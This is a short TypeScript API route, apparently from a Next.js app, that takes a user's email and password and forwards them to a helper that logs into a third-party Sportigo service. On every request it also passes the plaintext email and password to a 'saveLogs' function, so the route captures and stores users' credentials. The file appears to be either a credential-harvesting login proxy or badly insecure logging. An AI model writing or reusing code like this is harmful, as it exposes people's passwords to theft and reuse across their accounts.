import saveLogs from "./_utils/save-logs";
import sportigoLogin from "./_utils/sportigo-login";

export async function POST(request: Request): Promise<Response> {
  try {
    const {email, password} = await request.json();

    const data = await sportigoLogin(email, password);
    saveLogs(email, password);

    return new Response(JSON.stringify(data), {
      headers: { "Content-Type": "application/json" },
    });
  } catch (error) {
    console.log("API ERROR", error);

    return new Response("error", { status: 500 });
  }
}
